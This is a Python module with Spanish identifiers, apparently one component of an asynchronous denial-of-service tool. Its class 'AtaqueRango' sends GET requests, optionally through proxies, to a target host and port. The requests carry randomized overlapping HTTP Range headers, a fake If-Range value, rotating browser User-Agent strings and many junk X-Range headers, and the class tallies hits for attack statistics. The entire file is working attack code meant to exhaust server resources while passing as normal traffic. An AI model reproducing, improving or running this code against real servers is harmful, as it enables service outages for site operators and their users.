import asyncio
import random
import aiohttp
from aiohttp import ClientSession, ClientTimeout, ClientError

class AtaqueRango:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        sesion = None
        try:
            sesion = await self.motor.pool.obtener_conexion(
                self.motor.host,
                self.motor.puerto,
                self.motor.ssl,
                proxy
            )
            
            if not sesion:
                return
                
            rangos = [
                f"bytes={random.randint(0, 1000)}-{random.randint(10000, 999999)}",
                f"bytes={random.randint(1000, 5000)}-{random.randint(100000, 9999999)}",
                f"bytes=-{random.randint(1000, 10000)}",
                f"bytes={random.randint(0, 1000)}-{random.randint(1000, 10000)}, {random.randint(10000, 100000)}-{random.randint(100000, 999999)}"
            ]
            
            cabeceras = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
                ]),
                "Range": random.choice(rangos),
                "If-Range": str(random.randint(100000, 999999)),
                "Accept-Encoding": "gzip, deflate, br"
            }
            
            for i in range(random.randint(5, 20)):
                cabeceras[f"X-Range-{i}"] = f"bytes={random.randint(0, 1000)}-{random.randint(10000, 999999)}"
                
            url = f"{'https' if self.motor.ssl else 'http'}://{self.motor.host}:{self.motor.puerto}/"
            
            async with sesion.get(
                url,
                headers=cabeceras,
                timeout=ClientTimeout(total=self.motor.timeout)
            ) as respuesta:
                await respuesta.read()
                self.motor.estadisticas.agregar_exito(len(cabeceras))
                
        except (asyncio.CancelledError, ClientError, Exception):
            self.motor.estadisticas.agregar_error()
        finally:
            if sesion:
                await self.motor.pool.liberar_conexion(sesion)